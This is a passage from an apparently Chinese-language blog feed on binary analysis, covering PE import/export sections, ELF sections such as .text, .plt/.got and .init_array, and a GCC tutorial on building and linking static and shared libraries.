id="edata和idata节">.edata和.idata节</h4><blockquote><p>在PE二进制文件中很重要的.edata和.idata节，在ELF格式中是没有的，它们分别包含了导出表和导入表。</p></blockquote><ul><li><p>.idata节指定了从共享库或者DLL文件导入的符号（函数与数据）。</p></li><li><p>.edata节列出了PE二进制文件的导出符号和地址信息。</p></li></ul><p>为了解析对外部符号的引用，加载器需要将导入信息与提供符号的DLL的导出表进行匹配。</p><p>可能会发现没有单独的.edata和.idata节。实际上，清单3-2中的PE二进制文件中也没有它们。当这些节不存在的时候，意味着它们通常被合并成.rdata节，但它们的内容和工作方式依旧没变。</p><p>当加载器需要解析依赖项（文件/变量）时，加载器将解析后的地址导入地址表（Import Address Table，IAT）。与ELF中的全局偏移表（GOT）相似，IAT就是一槽一指针地解析指针表。动态加载器将这些指针替换为指向实际导入的函数或者变量地址。然后，对库函数调用的实现等同于该函数对thunk的调用，这只是对函数IAT的间接跳转。</p><h4 id="pe代码节的填充">PE代码节的填充</h4><p>在反汇编PE二进制文件的时候，可能会注意到有很多int3指令。Visual Studio发出这些指令作为填充（而不是GCC使用的nop指令）来对齐内存中的函数和代码块，以便对其进行有效访问。[2]调试器通常使用int3指令设置断点，如果不存在调试器，该指令会导致程序尝试去捕获调试器或者崩溃。但对代码填充来说，这是可以接受的，因为我们不打算执行这些填充的指令。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3 ELF节</title>
      <link href="/2023/12/18/Security/binary/ELF/3.ELF%E8%8A%82/"/>
      <url>/2023/12/18/Security/binary/ELF/3.ELF%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h2 id="elf节">ELF节</h2><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260956709.png" alt="image-20220923162501124" style="zoom: 67%;" /><img src="mdPic/image-20220923162517638.png" alt="image-20220923162517638" style="zoom: 67%;" /><p>对于各个节，readelf都会显示相关的基本信息，包括节头表里的索引、节的名称和类型。此外，你还可以查看节的虚拟地址、文件偏移及大小。对包含诸如符号表和重定向表的节，还有一列显示每个条目的大小。最后，readelf还显示每个节的相关标志、链接节的索引（如果存在）、其他信息（特定于节类型）及对齐要求。</p><h4 id="init和fini节">.init和.fini节</h4><p>.init节（清单2-5中的索引11）包含可执行代码，==用于执行初始化工作，并且在二进制文件执行其他代码之前运行。==可执行代码会有SHF_EXECINSTR标志，使用readelf查看Flg列，可发现该值为X❷。将控制权转移到二进制文件的main入口点之前，系统会先执行.init节的代码，如果熟悉面向对象编程，你可以将.init节看作构造函数。</p><p>.fini节（索引15）类似于.init节，不同之处在于其在主程序运行完后执行，本质上起到一种析构函数的作用。</p><h4 id="text节"><mark>.text节</mark></h4><p>.text节包含程序的主要代码，所以它是二进制文件分析或者逆向工作的重点。</p><p>.text节的类型为SHT_PROGBITS❸，因为其包含用户定义的代码。同时要注意节的标志，这些标志位指定了该节为可执行的节，但不可写入❹==。一般来说，可执行的节是不可写的，反之，可写的节一般是不可执行的，因为既可写又可执行的节会让攻击者利用漏洞直接覆盖代码来修改程序，使得攻击变得容易。==</p><p>除了从源代码编译的某些特定应用程序以外，GCC编译的典型二进制文件中的.text节包含了许多执行初始化和终止任务的标准函数，如__start、register_tm_clones及frame_dummy。现在_start是最重要的标准函数，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260956664.png" alt="image-20220923164407609" style="zoom:67%;" /><p>在编写C程序时，需要以一个main函数开始，但是如果检查二进制文件的入口点，你会发现它没有指向main的地址0x400526❹，而是指向了0x400430，即_start❶的开头。</p><p>那么反汇编到底是怎么到达main函数的呢？如果看得仔细一点，你会发现__start在地址0x40044d处包含了一条指令，该指令将main地址移动到rdi寄存器❷。</p><p>该寄存器是在x64平台进行函数调用时传递参数的寄存器之一。随后__start调用了一个名为_libc_start_main❸的函数， 该函数位于.plt节，意味着该函数是共享库的一部分。_libc_start_main最终调用main的地址，并开始执行用户定义的代码。</p><h4 id="bss-data及rodata节">.bss、.data及.rodata节</h4><p>通常因为代码节不可写，所以变量会被保存在一个或多个可写的专用节中。</p><p>常量一般保存在自身的节中，使二进制文件变得井井有条。</p><p>编译器有时会在代码节中输出常量数据，目前版本的GCC和Clang通常不会混淆代码和数据，但Visual Studio有时会混淆代码和数据。</p><ul><li><p>.rodata节代表“只读数据”，用于存储常量，因此==.rodata节是不可写的==。</p></li><li><p>初始化变量的默认值存储在.data节中，因为变量的值可能会在运行时修改，所以==.data节被标记为可写==。</p></li><li><p>.bss节为未初始化的变量保留空间，最初.bss节的名称代表着“以符号开头的块”，是为（符号）变量保留内存块的意思。<mark>.bss节中的变量被初始化为零，并且该节被标记为可写。</mark></p></li></ul><h4 id="延迟绑定和-plt-got及gotplt节">延迟绑定和 .plt、.got及.got.plt节</h4><p><mark>在将二进制文件加载到进程中执行的时候动态链接器执行了最后的重定位。<mark>例如在编译时由于不知道加载地址，因此它会解析共享库中函数的引用。这里需要简单介绍一下，</mark><u>实际上在加载二进制文件的时候许多重定位一般都不会立即完成，而是延迟到未解析位置进行首次引用之前，这就是延迟绑定。</u></mark></p><p>1．延迟绑定和 .plt</p><p>延迟绑定保证了动态链接器不会在重定位上浪费时间，而只在运行中有需要的时候执行。在Linux操作系统上，延迟绑定是动态链接器的默认行为。导出环境变量LD_BIND_NOW可以强制链接器执行所有重定位，[2]除非应用程序有实时性能要求，否则通常不会这样做。</p><p><strong><mark>Linux ELF二进制文件中的延迟绑定是通过两个特殊的节实现的，这两个节分别称为过程链接表（Procedure Linkage Table，PLT，也称.plt节）和全局偏移表（Global Offset Table，GOT，也称.got节）。</mark></strong></p><p>ELF二进制文件通常包含一个单独的、名为.got.plt的 GOT，用于在延迟绑定过程中与.plt节结合使用。.got.plt节类似于 常规的.got节，.plt节是包含可执行代码的代码节，就像.text节，而.got.plt则是数据节。</p><p>PLT由定义好格式的存根组成，用于从.text节到合适库文件的调用。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260956850.png" alt="image-20220923215733834" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260956126.png" alt="image-20220923220333523" style="zoom: 67%;" /><p>PLT的格式如下：首先有一个默认存根❶（稍后讨论），然后是一系列函数存根❷❹：每个库函数一个存根，它们都遵循相同的模式，并且其压入栈的值依次递增❸❺，而该值是一个标识符（会在稍后介绍）。现在我们研究清单2-7中所示的PLT存根如何调用共享库函数（见图2-2），以及如何辅助延迟绑定过程。</p><p><mark><strong>.got和.got.plt节的区别：.got用于引用数据项，而.got.plt用于存储通过PLT访问的（已解析的）库函数地址。</strong></mark></p><h4 id="rel和rela节">.rel.*和.rela.*节</h4><p>名为rela.*的节，节的类型为SHT_RELA，这意味着它们包含链接器用于执行重定位的信息。</p><h4 id="dynamic节">.dynamic节</h4><p>在加载和创建要执行的ELF二进制文件时，.dynamic节将充当操作系统和动态链接器的“路线图”。</p><p>.dynamic节包含了一个Elf64_Dyn的结构体数组（在/usr/include/elf.h中指定），也称为标签（tag）。标签有各种类型，而每个标签都有一个关联值。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260956325.png" alt="image-20220923221922574" style="zoom: 67%;" /><p>如清单2-9所示，.dynamic节中每个标签的类型都显示在输出的第二列中。类型为DT_NEEDED的标签会通知动态链接器关于可执行文件的依赖问题，如二进制文件使用libc.so.6共享库❶中的puts函数，因此在执行二进制文件时需要将其加载。DT_VERNEED❷和DT_VERNEEDNUM❸ 类型的标签指定了版本依赖表的起始地址和条目数，而版本依赖表则指定了可执行文件的各种依赖的预期版本。</p><p>除了列出的依赖关系之外，.dynamic节还包含指向动态链接器所需的其他重要信息的指针（如由类型分别 为DT_STRTAB、DT_SYMTAB、DT_PLTGOT及DT_RELA的标签指定的动态字符串表、动态符号表、.got.plt节及动态重定位节）。</p><h4 id="init_array和fini_array节">.init_array和.fini_array节</h4><p>.init_array节包含一个指向构造函数的指针数组，在二进制文件被初始化之后、main函数被调用之前，这些构造函数会被依次调用。虽然前面提到.init节包含可执行代码，在启动可执行文件前执行一些关键的初始化工作，但.init_array节却是一个数据节，其中包含所需数量的函数指针，包括指向自定义构造的函数指针。</p><p>在GCC中，可以通过 <strong>attribute</strong>((constructor))装饰C源文件中的函数，并将其标记为构造函数。</p><p>.fini_array的确与.init_array相似，.fini_array包含指向析构函数的指针，但是.init_array和.fini_array中包含的指针很容易被修改，使其成为方便插入钩子的位置。钩子将初始化或者结束代码添加至二进制文件中以修改其行为。要注意较早版本的GCC生成的二进制文件可能包含名为.ctors和.dtors的节，而不是.init_array和.fini_array。</p><h4 id="shstrtab-symtab-strtab-dynsym-及dynstr节">.shstrtab、.symtab、.strtab、.dynsym 及.dynstr节</h4><ul><li>.shstrtab节只是一个以NULL结尾的字符串数组，其中包含二进制文件中所有节的名称。其通过节头进行索引，允许诸如readelf之类的工具找出节的名称。</li><li>.symtab节包含一个符号表，该表是一个Elf64_Sym结构体数组，每个条目都将符号名与二进制文件中的代码和数据（如函数或者变量）相关联。</li><li>包含符号名的实际字符串保存在.strtab节中，而这些字符串被Elf64_Sym结构体所指。在二进制分析的实际情况中，文件一般都会被剥离，这意味着.symtab和.strtab节中的表已经被删除。</li><li>.dynsym和.dynstr节类似于.symtab和.strtab，不同之处在于它们包含了动态链接而非静态链接所需的符号和字符串。因为在动态链接期间需要这些节的信息，所以不能剥离。</li></ul><p>另外要注意，静态符号表的节类型为SHT_SYMTAB，而动态符号表的节类型为SHT_SYNSYM。这样诸如strip之类的工具在剥离二进制文件的时候就可以轻松地识别，哪些符号表可以安全地删除，哪些不能删除。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gcc介绍以及使用</title>
      <link href="/2023/12/18/Security/binary/compile/GCC%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/12/18/Security/binary/compile/GCC%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><strong>介绍</strong></h2><p>GCC（英文全拼：GNU Compiler Collection）是 GNU 工具链的主要组成部分，是一套以 GPL 和 LGPL 许可证发布的程序语言编译器自由软件，由 Richard Stallman 于 1985 年开始开发。</p><p>GCC 原名为 GNU C语言编译器，因为它原本只能处理 C 语言，但如今的 GCC 不仅可以编译 C、C++ 和 Objective-C，还可以通过不同的前端模块支持各种语言，包括 Java、Fortran、Ada、Pascal、Go 和 D 语言等等。</p><p>GCC 的编译过程可以划分为四个阶段：预处理（Pre-Processing）、编译（Compiling）、汇编（Assembling）以及链接（Linking）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261013358.jpeg" alt="img"></p><p>Linux 程序员可以根据自己的需要控制 GCC 的编译阶段，以便检查或使用编译器在该阶段的输出信息，帮助调试和优化程序。以 C 语言为例，从源文件的编译到可执行文件的运行，整个过程大致如下。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261013379.jpeg" alt="img"></p><p>各文件后缀说明如下：</p><table><thead><tr><th>后缀</th><th>描述</th><th>后缀</th><th>描述</th></tr></thead><tbody><tr><td>.c</td><td>C 源文件</td><td>.s/.S</td><td>汇编语言源文件</td></tr><tr><td>.C/.cc/.cxx/.cpp</td><td>C++ 源文件</td><td>.o/.obj</td><td>目标文件</td></tr><tr><td>.h</td><td>C/C++ 头文件</td><td>.a/.lib</td><td>静态库</td></tr><tr><td>.i/.ii</td><td>经过预处理的 C/C++ 文件</td><td>.so/.dll</td><td>动态库</td></tr></tbody></table><p><strong>语法</strong>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc [options] file...</span><br></pre></td></tr></table></figure><p><strong>选项</strong>：</p><ul><li><code>-pass-exit-codes</code> ：从一个阶段以最高错误代码退出。</li><li><code>--target-help</code> ：显示特定于目标的命令行选项。</li><li><code>--help=&#123;common|optimizers|params|target|warnings|[^]&#123;joined|separate|undocumented&#125;&#125;[,...]</code> ：显示特定类型的命令行选项（使用 <code>-v --help</code> 显示子进程的命令行选项）。</li><li><code>-dumpspecs</code> ：显示所有内置规范字符串。</li><li><code>-dumpversion</code> ：显示编译器的版本。</li><li><code>-dumpmachine</code> ：显示编译器的目标处理器。</li><li><code>-print-search-dirs</code> ：显示编译器搜索路径中的目录。</li><li><code>-print-libgcc-file-name</code> ：显示编译器配套库的名称。</li><li><code>-print-file-name=&lt;lib&gt;</code> ：显示库 <code>&lt;lib&gt;</code> 的完整路径。</li><li><code>-print-prog-name=&lt;prog&gt;</code> ：显示编译器组件 <code>&lt;prog&gt;</code> 的完整路径。</li><li><code>-print-multiarch</code> ：显示目标的规范化 GNU 三元组，用作库路径中的一个组件。</li><li><code>-print-multi-directory</code> ：显示 libgcc 版本的根目录。</li><li><code>-print-multi-lib</code> ：显示命令行选项和多个库搜索目录之间的映射。</li><li><code>-print-multi-os-directory</code> ：显示操作系统库的相对路径。</li><li><code>-print-sysroot</code> ：显示目标库目录。</li><li><code>-print-sysroot-headers-suffix</code> ：显示用于查找标题的 sysroot 后缀。</li><li><code>-Wa,&lt;options&gt;</code> ：将逗号分隔的 <code>&lt;options&gt;</code> 传递给汇编器（assembler）。</li><li><code>-Wp,&lt;options&gt;</code> ：将逗号分隔的 <code>&lt;options&gt;</code> 传递给预处理器（preprocessor）。</li><li><code>-Wl,&lt;options&gt;</code> ：将逗号分隔的 <code>&lt;options&gt;</code> 传递给链接器（linker）。</li><li><code>-Xassembler &lt;arg&gt;</code> ：将 <code>&lt;arg&gt;</code> 传递给汇编器（assembler）。</li><li><code>-Xpreprocessor &lt;arg&gt;</code> ：将 <code>&lt;arg&gt;</code> 传递给预处理器（preprocessor）。</li><li><code>-Xlinker &lt;arg&gt;</code> ：将 <code>&lt;arg&gt;</code> 传递给链接器（linker）。</li><li><code>-save-temps</code> ：不用删除中间文件。</li><li><code>-save-temps=&lt;arg&gt;</code> ：不用删除指定的中间文件。</li><li><code>-no-canonical-prefixes</code> ：在构建其他 gcc 组件的相对前缀时，不要规范化路径。</li><li><code>-pipe</code> ：使用管道而不是中间文件。</li><li><code>-time</code> ：为每个子流程的执行计时。</li><li><code>-specs=&lt;file&gt;</code> ：使用 <code>&lt;file&gt;</code> 的内容覆盖内置规范。</li><li><code>-std=&lt;standard&gt;</code> ：假设输入源为 <code>&lt;standard&gt;</code>。</li><li><code>--sysroot=&lt;directory&gt;</code> ：使用 <code>&lt;directory&gt;</code> 作为头文件和库的根目录。</li><li><code>-B &lt;directory&gt;</code> ：将 <code>&lt;directory&gt;</code> 添加到编译器的搜索路径。</li><li><code>-v</code> ：显示编译器调用的程序。</li><li><code>-###</code> ：与 <code>-v</code> 类似，但引用的选项和命令不执行。</li><li><code>-E</code> ：仅执行预处理（不要编译、汇编或链接）。</li><li><code>-S</code> ：只编译（不汇编或链接）。</li><li><code>-c</code> ：编译和汇编，但不链接。</li><li><code>-o &lt;file&gt;</code> ：指定输出文件。</li><li><code>-pie</code> ：创建一个动态链接、位置无关的可执行文件。</li><li><code>-I</code> ：指定头文件的包含路径。</li><li><code>-L</code> ：指定链接库的包含路径。</li><li><code>-shared</code> ：创建共享库/动态库。</li><li><code>-static</code> ：使用静态链接。</li><li><code>--help</code> ：显示帮助信息。</li><li><code>--version</code> ：显示编译器版本信息。</li></ul><h2 id="示例"><strong>示例</strong></h2><h3 id="阶段编译"><strong>阶段编译</strong></h3><p>假设有文件 hello.c，内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, GetIoT\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译 hello.c，默认输出 a.out</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c</span><br></pre></td></tr></table></figure><p>编译 hello.c 并指定输出文件为 hello</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -o hello</span><br></pre></td></tr></table></figure><p>只执行预处理，输出 hello.i 源文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><p>只执行预处理和编译，输出 hello.s 汇编文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c</span><br></pre></td></tr></table></figure><p>也可以由 hello.i 文件生成 hello.s 汇编文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p>只执行预处理、编译和汇编，输出 hello.o 目标文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c</span><br></pre></td></tr></table></figure><p>也可以由 hello.i 或 hello.s 生成目标文件 hello.o</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.i -o hello.o</span><br><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>由 hello.o 目标文件链接成可执行文件 hello</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><h3 id="使用静态库"><strong>使用静态库</strong></h3><p>创建一个 foo.c 文件，内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is a static library\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 foo.c 编译成静态库 libfoo.a</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c foo.c             # 生成 foo.o 目标文件</span><br><span class="line">ar rcs libfoo.a foo.o    # 生成 libfoo.a 静态库</span><br></pre></td></tr></table></figure><p>查看文件描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ file *</span><br><span class="line">foo.c:    C source, ASCII text</span><br><span class="line">foo.o:    ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span><br><span class="line">libfoo.a: current ar archive</span><br></pre></td></tr></table></figure><p>修改 hello.c 文件，调用 foo 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, GetIoT\n&quot;</span>);</span><br><span class="line">    foo();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译 hello.c 并链接静态库 libfoo.a（加上 <code>-static</code> 选项）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -static libfoo.a -o hello</span><br></pre></td></tr></table></figure><p>也可以使用 <code>-L</code> 指定库的搜索路径，并使用 <code>-l</code> 指定库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -static -L. -lfoo -o hello</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">Hello, GetIoT</span><br><span class="line">Here is a static library</span><br></pre></td></tr></table></figure><p>查看 hello 文件描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file hello</span><br><span class="line">hello: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=b72236c2211dd8f0c3003bc02ad5e70bb2354e8c, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h3 id="使用共享库"><strong>使用共享库</strong></h3><p>修改 foo.c 文件，内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is a shared library\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为动态库/共享库（由于动态库可以被多个进程共享加载，所以需要使用 <code>-fPIC</code> 选项生成位置无关的代码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc foo.c -shared -fPIC -o libfoo.so</span><br></pre></td></tr></table></figure><p>hello.c 代码无需修改，内容仍然如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, GetIoT\n&quot;</span>);</span><br><span class="line">    foo();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译 hello.c 并链接共享库 <a href="http://libfoo.so">libfoo.so</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c libfoo.so -o hello</span><br></pre></td></tr></table></figure><p>也可以使用 <code>-L</code> 和 <code>-l</code> 选项指定库的路径和名称</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -L. -lfoo -o hello</span><br></pre></td></tr></table></figure><p>但是此时运行 hello 程序失败</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">./hello: error while loading shared libraries: libfoo.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>原因是找不到 <a href="http://libfoo.so">libfoo.so</a> 共享库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ldd hello</span><br><span class="line">        linux-vdso.so.1 (0x00007fff5276d000)</span><br><span class="line">        libfoo.so =&gt; not found</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcc90fa7000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fcc911bd000)</span><br></pre></td></tr></table></figure><p>这是因为 <a href="http://libfoo.so">libfoo.so</a> 并不在 Linux 系统的默认搜索目录中，解决办法是我们主动告诉系统，<a href="http://libfoo.so">libfoo.so</a> 共享库在哪里。</p><p><strong>方式一</strong>：设置环境变量 <code>LD_LIBRARY_PATH</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=$(pwd)</span><br></pre></td></tr></table></figure><p>将 <a href="http://libfoo.so">libfoo.so</a> 所在的当前目录添加到 <code>LD_LIBRARY_PATH</code> 变量，再次执行 hello</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">Hello, GetIoT</span><br><span class="line">Here is a shared library</span><br></pre></td></tr></table></figure><p><strong>方式二</strong>：使用 rpath 将共享库位置嵌入到程序</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -L. -lfoo -Wl,-rpath=`pwd` -o hello</span><br></pre></td></tr></table></figure><p>rpath 即 run path，是种可以将共享库位置嵌入程序中的方法，从而不用依赖于默认位置和环境变量。这里在链接时使用 <code>-Wl,-rpath=/path/to/yours</code> 选项，<code>-Wl</code> 会发送以逗号分隔的选项到链接器，注意逗号分隔符后面没有空格哦。</p><p>这种方式要求共享库必须有一个固定的安装路径，欠缺灵活性，不过如果设置了 <code>LD_LIBRARY_PATH</code>，程序加载时也是会到相应路径寻找共享库的。</p><p><strong>方式三</strong>：将 <a href="http://libfoo.so">libfoo.so</a> 共享库添加到系统路径</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp libfoo.so /usr/lib/</span><br></pre></td></tr></table></figure><p>执行程序</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">Hello, GetIoT</span><br><span class="line">Here is a shared library</span><br></pre></td></tr></table></figure><p>如果 hello 程序仍然运行失败，请尝试执行 <a href="https://link.zhihu.com/?target=https%3A//getiot.tech/linux-command/ldconfig.html">ldconfig</a> 命令更新共享库的缓存列表。</p><p>此时，再次查看 hello 程序的共享库依赖</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ldd hello</span><br><span class="line">        linux-vdso.so.1 (0x00007ffecfbb1000)</span><br><span class="line">        libfoo.so =&gt; /lib/libfoo.so (0x00007f3f3f1ad000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f3efbb000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f3f3f1d6000)</span><br></pre></td></tr></table></figure><p>可以看到 <a href="http://libfoo.so">libfoo.so</a> 已经被发现了，其中 /lib 是 /usr/lib 目录的软链接。</p><p>示例代码可以在 <a href="https://link.zhihu.com/?target=https%3A//github.com/getiot/linux-c/tree/main/hello">GitHub</a> 找到。</p><hr><p>原文链接：</p><p><a href="https://link.zhihu.com/?target=https%3A//getiot.tech/linux-command/gcc.html">gcc 命令 - 人人都懂物联网getiot.tech/linux-command/gcc.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE的基本概念</title>
      <link href="/2023/12/18/Security/binary/PE/PE%E6%96%87%E4%BB%B6/"/>
      <url>/2023/12/18/Security/binary/PE/PE%E6%96%87%E4%BB%B6/</url>
      
